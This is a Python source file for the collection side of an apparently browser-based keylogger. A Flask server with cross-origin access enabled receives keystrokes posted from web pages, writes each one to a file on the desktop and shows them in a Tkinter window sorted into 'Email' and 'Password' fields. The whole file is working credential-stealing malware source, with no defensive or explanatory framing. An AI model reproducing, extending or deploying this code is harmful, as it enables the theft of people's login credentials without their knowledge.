from flask import Flask, request
import logging
import tkinter as tk
from tkinter import scrolledtext
import threading
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Enable Cross-Origin Resource Sharing

# Set up logging to log keystrokes to a file
file_path = r'c:\Users\mikek\Desktop\output.txt'
logging.basicConfig(filename=file_path, level=logging.DEBUG, format="%(asctime)s - %(message)s")

# Create the main Tkinter window for displaying keystrokes
root = tk.Tk()
root.title("Keylogger Output")

# Create a scrolled text widget for output
text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=50, height=20, state='normal')
text_area.pack(padx=10, pady=10)

# Shared buffer to store the keystrokes
text_buffer = []
current_field = "Email"  # Default is 'Email'
field_logged = {"Email": False, "Password": False}  # Track if the field label has been logged

@app.route('/log', methods=['POST'])
def log_key():
    global current_field
    data = request.get_json()
    key = data.get('key', '')

    # Handle the "Tab" key to switch between Email and Password fields
    if key.lower() == "tab":
        if current_field == "Email":
            current_field = "Password"
            if not field_logged["Password"]:
                text_buffer.append("\nPassword: ")  # Add "Password:" label only once
                field_logged["Password"] = True
        else:
            current_field = "Email"
            if not field_logged["Email"]:
                text_buffer.append("\nEmail: ")  # Add "Email:" label only once
                field_logged["Email"] = True

    # Process other keystrokes
    elif key.lower() == "backspace":
        if text_buffer:
            text_buffer.pop()  # Remove the last character from the buffer
    elif key.lower() not in ["shift", "ctrl", "alt", "capslock", "tab"]:  # Ignore modifier keys
        if current_field == "Email" and not field_logged["Email"]:
            text_buffer.append("Email: ")  # Ensure the "Email:" label appears on the first keystroke
            field_logged["Email"] = True
        elif current_field == "Password" and not field_logged["Password"]:
            text_buffer.append("\nPassword: ")  # Ensure "Password:" starts on a new line
            field_logged["Password"] = True

        text_buffer.append(key)  # Append the key to the buffer

    # Log the keystroke to the file
    logging.info(key)
    with open(file_path, 'a') as f:
        f.write(key + '\n')

    # Function to update the Tkinter text area (GUI) with the current buffer content
    def update_text_area():
        text_area.delete(1.0, tk.END)  # Clear the existing text
        text_area.insert(tk.END, ''.join(text_buffer))  # Insert the updated content
        text_area.see(tk.END)  # Scroll to the bottom

    # Update the Tkinter GUI in the main thread
    root.after(0, update_text_area)

    return '', 204  # Respond with 'No Content'

def run_flask():
    app.run(port=5000)

if __name__ == '__main__':
    # Start the Flask server in a separate thread
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    # Run the Tkinter main loop for displaying the GUI
    root.mainloop()
